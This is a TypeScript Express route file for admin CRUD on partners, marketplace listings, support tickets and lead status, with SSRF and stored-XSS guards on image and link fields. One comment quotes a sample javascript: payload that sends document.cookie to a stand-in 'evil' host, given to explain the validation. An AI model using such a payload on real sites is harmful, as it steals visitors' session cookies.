// Admin content management: partners CRUD, marketplace CRUD, ticket
// status + replies, suggestion-request status. All gated to admin /
// superadmin; partner + marketplace writes additionally require
// comm.partners (the marketing-side privilege).
//
// Stored XSS / SSRF guards on `image` and `externalUrl` fields exist
// because those values render straight into <img src> / <a href> on
// the user-facing surfaces. Validate at write time so a hostile admin
// can't store `javascript:` URLs that fire on every visitor click,
// and so the briefing service's image fetcher can't be steered into
// loopback / cloud-metadata.

import type { Express, RequestHandler } from "express";
import { db } from "../firebase";
import { requireAuth } from "../auth";
import { errMsg } from "../services/errMsg";
import { notifyUser } from "../services/push";
import { isPublicHttpsUrl } from "../services/safeRedirect";
import { reqStr } from "../util";
import {
  COL,
  type MarketplaceLead,
  type MarketplaceListing,
  type MarketplaceListingStatus,
  type MarketplaceListingTag,
  type Partner,
  type PlatformPrivilegeKey,
  type Role,
  type SuggestionRequest,
  type Ticket,
  type TicketPriority,
} from "../../shared/firestore-schema";

const PARTNER_TYPES = new Set(["broker", "contractor", "legal", "cleaning", "insurance", "other"]);
const PARTNER_DURATION_MONTHS = new Set([1, 2, 3, 6, 12]);

const MARKETPLACE_STATUSES = new Set<MarketplaceListingStatus>([
  "active",
  "draft",
  "sold",
  "withdrawn",
]);
const MARKETPLACE_TAGS = new Set<MarketplaceListingTag>([
  "Hot Deal",
  "New",
  "Featured",
  "Off-market",
]);

// Until the ticket CRUD endpoints share a constants module with the
// user-side POST /api/tickets in server/routes/tickets.ts, the two
// allow-lists are duplicated. Source of truth is shared/firestore-schema.ts
// (the Ticket.category + TicketPriority unions); these arrays just
// echo it for runtime validation.
const TICKET_CATEGORIES: Ticket["category"][] = [
  "billing",
  "technical",
  "account",
  "general",
  "property",
];
const TICKET_PRIORITIES: TicketPriority[] = ["low", "medium", "high", "urgent"];

function addMonthsISO(base: Date, months: number): string {
  const d = new Date(base.getTime());
  d.setUTCMonth(d.getUTCMonth() + months);
  return d.toISOString();
}

export interface AdminContentDeps {
  requireRole: (...roles: Role[]) => RequestHandler;
  requirePlatformPrivilege: (p: PlatformPrivilegeKey) => RequestHandler;
}

export function registerAdminContentRoutes(
  app: Express,
  { requireRole, requirePlatformPrivilege }: AdminContentDeps,
): void {
  // ── Partners CRUD ─────────────────────────────────────────────────

  app.post(
    "/api/admin/partners",
    requireAuth,
    requireRole("admin", "superadmin"),
    requirePlatformPrivilege("comm.partners"),
    async (req, res) => {
      try {
        const body = (req.body ?? {}) as Record<string, unknown>;
        const name = typeof body.name === "string" ? body.name.trim() : "";
        const type = typeof body.type === "string" ? body.type : "other";
        if (!name) return res.status(400).json({ error: "name is required" });
        if (!PARTNER_TYPES.has(type))
          return res.status(400).json({ error: "invalid partner type" });

        const durationMonths = typeof body.durationMonths === "number" ? body.durationMonths : 1;
        if (!PARTNER_DURATION_MONTHS.has(durationMonths))
          return res.status(400).json({ error: "durationMonths must be 1, 2, 3, 6, or 12" });

        const now = new Date();
        const ref = db().collection(COL.partners).doc();
        const partner: Partner = {
          id: ref.id,
          name,
          type: type as Partner["type"],
          contactName: typeof body.contactName === "string" ? body.contactName : "",
          email: typeof body.email === "string" ? body.email : "",
          phone: typeof body.phone === "string" ? body.phone : "",
          rating: typeof body.rating === "number" ? body.rating : 0,
          status: "active",
          activeUntil: addMonthsISO(now, durationMonths),
          location: typeof body.location === "string" ? body.location : "",
          image:
            typeof body.image === "string" && isPublicHttpsUrl(body.image)
              ? body.image.slice(0, 1000)
              : "",
          createdAt: now.toISOString(),
        };
        await ref.set(partner);
        res.status(201).json(partner);
      } catch (err: unknown) {
        res.status(500).json({ error: errMsg(err, "Failed to create partner") });
      }
    },
  );

  app.patch(
    "/api/admin/partners/:id",
    requireAuth,
    requireRole("admin", "superadmin"),
    requirePlatformPrivilege("comm.partners"),
    async (req, res) => {
      try {
        const ref = db().collection(COL.partners).doc(reqStr(req.params.id));
        const snap = await ref.get();
        if (!snap.exists) return res.status(404).json({ error: "Partner not found" });
        const body = (req.body ?? {}) as Record<string, unknown>;
        const allowed: Array<keyof Partner> = [
          "name",
          "type",
          "contactName",
          "email",
          "phone",
          "rating",
          "status",
          "location",
          "image",
        ];
        const patch: Record<string, unknown> = {};
        for (const k of allowed) {
          if (k in body) patch[k as string] = body[k as string];
        }
        // SSRF guard: image flows through to fetchImageAsDataUrl in
        // the briefing service. Reject at write time — belt + braces
        // (matches the POST /api/admin/partners check).
        if (typeof patch.image === "string" && !isPublicHttpsUrl(patch.image as string)) {
          return res.status(400).json({ error: "image must be a public https URL" });
        }
        if (patch.type && !PARTNER_TYPES.has(patch.type as string))
          return res.status(400).json({ error: "invalid partner type" });
        if (patch.status && patch.status !== "active" && patch.status !== "inactive")
          return res.status(400).json({ error: "invalid status" });

        await ref.set(patch, { merge: true });
        const updated = (await ref.get()).data() as Partner;
        res.json(updated);
      } catch (err: unknown) {
        res.status(500).json({ error: errMsg(err, "Failed to update partner") });
      }
    },
  );

  app.delete(
    "/api/admin/partners/:id",
    requireAuth,
    requireRole("admin", "superadmin"),
    requirePlatformPrivilege("comm.partners"),
    async (req, res) => {
      try {
        await db().collection(COL.partners).doc(reqStr(req.params.id)).delete();
        res.status(204).end();
      } catch (err: unknown) {
        res.status(500).json({ error: errMsg(err, "Failed to delete partner") });
      }
    },
  );

  // Renew — extend activeUntil by N months. Extends from max(now,
  // current activeUntil) so renewing an already-active partner adds
  // to their remaining time instead of resetting it.
  app.post(
    "/api/admin/partners/:id/renew",
    requireAuth,
    requireRole("admin", "superadmin"),
    requirePlatformPrivilege("comm.partners"),
    async (req, res) => {
      try {
        const body = (req.body ?? {}) as Record<string, unknown>;
        const durationMonths = typeof body.durationMonths === "number" ? body.durationMonths : 0;
        if (!PARTNER_DURATION_MONTHS.has(durationMonths))
          return res.status(400).json({ error: "durationMonths must be 1, 2, 3, 6, or 12" });

        const ref = db().collection(COL.partners).doc(reqStr(req.params.id));
        const snap = await ref.get();
        if (!snap.exists) return res.status(404).json({ error: "Partner not found" });
        const current = snap.data() as Partner;

        const now = new Date();
        const baseTime = Math.max(
          now.getTime(),
          current.activeUntil ? new Date(current.activeUntil).getTime() : 0,
        );
        const activeUntil = addMonthsISO(new Date(baseTime), durationMonths);

        await ref.set({ activeUntil, status: "active" }, { merge: true });
        const updated = (await ref.get()).data() as Partner;
        res.json(updated);
      } catch (err: unknown) {
        res.status(500).json({ error: errMsg(err, "Failed to renew partner") });
      }
    },
  );

  // ── Marketplace listings CRUD ─────────────────────────────────────

  app.get(
    "/api/admin/marketplace",
    requireAuth,
    requireRole("admin", "superadmin"),
    requirePlatformPrivilege("comm.partners"),
    async (_req, res) => {
      try {
        const snap = await db().collection(COL.marketplaceListings).get();
        const listings = snap.docs.map((d) => d.data() as MarketplaceListing);
        listings.sort((a, b) => (b.createdAt ?? "").localeCompare(a.createdAt ?? ""));
        res.json(listings);
      } catch (err: unknown) {
        res.status(500).json({ error: errMsg(err, "Failed to load marketplace") });
      }
    },
  );

  app.post(
    "/api/admin/marketplace",
    requireAuth,
    requireRole("admin", "superadmin"),
    requirePlatformPrivilege("comm.partners"),
    async (req, res) => {
      try {
        const body = (req.body ?? {}) as Record<string, unknown>;
        const title = typeof body.title === "string" ? body.title.trim() : "";
        const location = typeof body.location === "string" ? body.location.trim() : "";
        const price = Number(body.price);
        if (!title) return res.status(400).json({ error: "title is required" });
        if (!location) return res.status(400).json({ error: "location is required" });
        if (!Number.isFinite(price) || price < 0)
          return res.status(400).json({ error: "price must be a non-negative number" });

        const status =
          typeof body.status === "string" &&
          MARKETPLACE_STATUSES.has(body.status as MarketplaceListingStatus)
            ? (body.status as MarketplaceListingStatus)
            : "active";
        const tag =
          typeof body.tag === "string" && MARKETPLACE_TAGS.has(body.tag as MarketplaceListingTag)
            ? (body.tag as MarketplaceListingTag)
            : undefined;

        const ref = db().collection(COL.marketplaceListings).doc();
        const listing: MarketplaceListing = {
          id: ref.id,
          title,
          location,
          price,
          ...(typeof body.roi === "number" ? { roi: body.roi } : {}),
          ...(typeof body.beds === "number" ? { beds: body.beds } : {}),
          ...(typeof body.baths === "number" ? { baths: body.baths } : {}),
          ...(typeof body.sqm === "number" ? { sqm: body.sqm } : {}),
          ...(typeof body.image === "string" && isPublicHttpsUrl(body.image)
            ? { image: body.image.slice(0, 1000) }
            : {}),
          ...(tag ? { tag } : {}),
          status,
          // externalUrl is rendered as <a href={externalUrl}> on
          // MarketplacePage / OwnerDashboard. React
          // does NOT block javascript: hrefs, so a hostile admin
          // could store "javascript:fetch('https://evil/'+document.cookie)"
          // and every visitor clicking the listing card would
          // execute it. Validate at write time.
          ...(typeof body.externalUrl === "string" && /^https?:\/\//i.test(body.externalUrl)
            ? { externalUrl: body.externalUrl.slice(0, 2000) }
            : {}),
          createdAt: new Date().toISOString(),
        };
        await ref.set(listing);
        res.status(201).json(listing);
      } catch (err: unknown) {
        res.status(500).json({ error: errMsg(err, "Failed to create listing") });
      }
    },
  );

  app.patch(
    "/api/admin/marketplace/:id",
    requireAuth,
    requireRole("admin", "superadmin"),
    requirePlatformPrivilege("comm.partners"),
    async (req, res) => {
      try {
        const ref = db().collection(COL.marketplaceListings).doc(reqStr(req.params.id));
        const snap = await ref.get();
        if (!snap.exists) return res.status(404).json({ error: "Listing not found" });
        const body = (req.body ?? {}) as Record<string, unknown>;
        const allowed: Array<keyof MarketplaceListing> = [
          "title",
          "location",
          "price",
          "roi",
          "beds",
          "baths",
          "sqm",
          "image",
          "tag",
          "status",
          "externalUrl",
        ];
        const patch: Record<string, unknown> = {};
        for (const k of allowed) {
          if (k in body) patch[k as string] = body[k as string];
        }
        if (patch.status && !MARKETPLACE_STATUSES.has(patch.status as MarketplaceListingStatus))
          return res.status(400).json({ error: "invalid status" });
        if (patch.tag && !MARKETPLACE_TAGS.has(patch.tag as MarketplaceListingTag))
          return res.status(400).json({ error: "invalid tag" });
        // SSRF: image flows through fetchImageAsDataUrl in briefing.
        if (typeof patch.image === "string" && !isPublicHttpsUrl(patch.image as string)) {
          return res.status(400).json({ error: "image must be a public https URL" });
        }
        // Stored XSS: externalUrl renders as <a href>. Reject non-http(s).
        if (typeof patch.externalUrl === "string") {
          const url = patch.externalUrl as string;
          if (!/^https?:\/\//i.test(url)) {
            return res.status(400).json({ error: "externalUrl must be http(s)" });
          }
          patch.externalUrl = url.slice(0, 2000);
        }

        patch.updatedAt = new Date().toISOString();
        await ref.set(patch, { merge: true });
        const updated = (await ref.get()).data() as MarketplaceListing;
        res.json(updated);
      } catch (err: unknown) {
        res.status(500).json({ error: errMsg(err, "Failed to update listing") });
      }
    },
  );

  app.delete(
    "/api/admin/marketplace/:id",
    requireAuth,
    requireRole("admin", "superadmin"),
    requirePlatformPrivilege("comm.partners"),
    async (req, res) => {
      try {
        await db().collection(COL.marketplaceListings).doc(reqStr(req.params.id)).delete();
        res.status(204).end();
      } catch (err: unknown) {
        res.status(500).json({ error: errMsg(err, "Failed to delete listing") });
      }
    },
  );

  // ── Tickets (admin reply flow) ────────────────────────────────────

  app.patch(
    "/api/admin/tickets/:id",
    requireAuth,
    requireRole("admin", "superadmin"),
    requirePlatformPrivilege("comm.activityLog"),
    async (req, res) => {
      try {
        const ref = db().collection(COL.tickets).doc(reqStr(req.params.id));
        const snap = await ref.get();
        if (!snap.exists) return res.status(404).json({ error: "Ticket not found" });
        const existing = snap.data() as Ticket;
        const body = (req.body ?? {}) as Record<string, unknown>;
        const patch: Record<string, unknown> = {
          updatedAt: new Date().toISOString(),
        };
        if (body.status) {
          const s = String(body.status);
          if (!["open", "in_progress", "resolved", "closed"].includes(s))
            return res.status(400).json({ error: "invalid status" });
          patch.status = s;
        }
        if (body.priority) {
          const p = String(body.priority);
          if (!TICKET_PRIORITIES.includes(p as TicketPriority))
            return res.status(400).json({ error: "invalid priority" });
          patch.priority = p;
        }
        if (body.category) {
          const c = String(body.category);
          if (!TICKET_CATEGORIES.includes(c as Ticket["category"]))
            return res.status(400).json({ error: "invalid category" });
          patch.category = c;
        }
        await ref.set(patch, { merge: true });
        const updated = (await ref.get()).data() as Ticket;

        // Notify the tenant who raised the ticket on a real STATUS change so
        // their "Maintenance updates" preference gates a genuine send (it was
        // previously inert — no tenant-directed maintenance push existed).
        // Scoped to property/maintenance tickets, the same gate as the owner's
        // new-request push. Best-effort: a push hiccup must not fail the update.
        const statusChanged = typeof patch.status === "string" && patch.status !== existing.status;
        const effectiveCategory = (patch.category as string | undefined) ?? existing.category;
        if (statusChanged && existing.userId && effectiveCategory === "property") {
          const STATUS_LABEL: Record<string, string> = {
            open: "open",
            in_progress: "in progress",
            resolved: "resolved",
            closed: "closed",
          };
          await notifyUser({
            externalUserId: existing.userId,
            category: "maintenance",
            title: "Maintenance request updated",
            message: `Your request${existing.subject ? ` "${existing.subject}"` : ""} is now ${STATUS_LABEL[patch.status as string] ?? String(patch.status)}.`,
            url: "https://app.oliowallet.com/tenant",
          });
        }

        res.json(updated);
      } catch (err: unknown) {
        res.status(500).json({ error: errMsg(err, "Failed to update ticket") });
      }
    },
  );

  app.get(
    "/api/admin/tickets/:id/messages",
    requireAuth,
    requireRole("admin", "superadmin"),
    requirePlatformPrivilege("comm.activityLog"),
    async (req, res) => {
      try {
        const msgsSnap = await db()
          .collection(COL.tickets)
          .doc(reqStr(req.params.id))
          .collection("messages")
          .orderBy("createdAt", "asc")
          .get();
        res.json(msgsSnap.docs.map((d) => ({ id: d.id, ...(d.data() as object) })));
      } catch (err: unknown) {
        res.status(500).json({ error: errMsg(err, "Failed to load messages") });
      }
    },
  );

  app.post(
    "/api/admin/tickets/:id/messages",
    requireAuth,
    requireRole("admin", "superadmin"),
    requirePlatformPrivilege("comm.activityLog"),
    async (req, res) => {
      try {
        const { uid, profile, email } = req.user!;
        const body = (req.body ?? {}) as Record<string, unknown>;
        // 4kB cap mirrors the user-side ticket description. Admin-only
        // endpoint, low spam risk — this is a consistency cap to
        // bound Firestore doc growth.
        const text = typeof body.text === "string" ? body.text.trim().slice(0, 4000) : "";
        if (!text) return res.status(400).json({ error: "text is required" });

        const ticketRef = db().collection(COL.tickets).doc(reqStr(req.params.id));
        const ticketSnap = await ticketRef.get();
        if (!ticketSnap.exists) return res.status(404).json({ error: "Ticket not found" });

        const now = new Date().toISOString();
        const msgRef = ticketRef.collection("messages").doc();
        const message = {
          id: msgRef.id,
          sender: "agent" as const,
          authorId: uid,
          authorName:
            profile && (profile.firstName || profile.lastName)
              ? `${profile.firstName ?? ""} ${profile.lastName ?? ""}`.trim()
              : (email ?? "Admin"),
          text,
          createdAt: now,
        };
        await msgRef.set(message);
        await ticketRef.set({ status: "in_progress", updatedAt: now }, { merge: true });

        // Notify the ticket creator that they've got a reply. Trimmed
        // preview so a long reply doesn't blow past the OneSignal
        // display limit.
        const ticket = ticketSnap.data() as Ticket;
        if (ticket.userId) {
          const preview = text.length > 120 ? `${text.slice(0, 117)}…` : text;
          await notifyUser({
            externalUserId: ticket.userId,
            category: "messages",
            title: "New message from Olio Support",
            message: preview,
            url: "https://app.oliowallet.com/",
          });
        }

        res.status(201).json(message);
      } catch (err: unknown) {
        res.status(500).json({ error: errMsg(err, "Failed to send reply") });
      }
    },
  );

  // ── Suggestion-request status ─────────────────────────────────────

  app.patch(
    "/api/admin/suggestion-requests/:id",
    requireAuth,
    requireRole("admin", "superadmin"),
    // Same gate as the read sibling (GET /api/admin/suggestion-requests) so a
    // sub-role that can't VIEW these leads (sales/marketing: comm.activityLog
    // = false) also can't mutate their status — a write must never be looser
    // than its matching read.
    requirePlatformPrivilege("comm.activityLog"),
    async (req, res) => {
      try {
        const ref = db().collection(COL.suggestionRequests).doc(reqStr(req.params.id));
        const snap = await ref.get();
        if (!snap.exists) return res.status(404).json({ error: "Lead not found" });
        const body = (req.body ?? {}) as Record<string, unknown>;
        const patch: Record<string, unknown> = {};
        if (body.status) {
          const s = String(body.status);
          if (!["new", "contacted", "closed"].includes(s))
            return res.status(400).json({ error: "invalid status" });
          patch.status = s;
        }
        await ref.set(patch, { merge: true });
        const updated = (await ref.get()).data() as SuggestionRequest;
        res.json(updated);
      } catch (err: unknown) {
        res.status(500).json({ error: errMsg(err, "Failed to update lead") });
      }
    },
  );

  // ── Marketplace-lead status ───────────────────────────────────────

  app.patch(
    "/api/admin/marketplace-leads/:id",
    requireAuth,
    requireRole("admin", "superadmin"),
    // Same gate as the read sibling (GET /api/admin/marketplace-leads): a
    // sub-role denied the listing must not be able to mutate (or read back via
    // the echo) a lead. Write gate matches the read gate.
    requirePlatformPrivilege("comm.activityLog"),
    async (req, res) => {
      try {
        const ref = db().collection(COL.marketplaceLeads).doc(reqStr(req.params.id));
        const snap = await ref.get();
        if (!snap.exists) return res.status(404).json({ error: "Lead not found" });
        const body = (req.body ?? {}) as Record<string, unknown>;
        const patch: Record<string, unknown> = {};
        if (body.status) {
          const s = String(body.status);
          if (!["new", "contacted", "closed"].includes(s))
            return res.status(400).json({ error: "invalid status" });
          patch.status = s;
        }
        await ref.set(patch, { merge: true });
        const updated = (await ref.get()).data() as MarketplaceLead;
        res.json(updated);
      } catch (err: unknown) {
        res.status(500).json({ error: errMsg(err, "Failed to update lead") });
      }
    },
  );
}
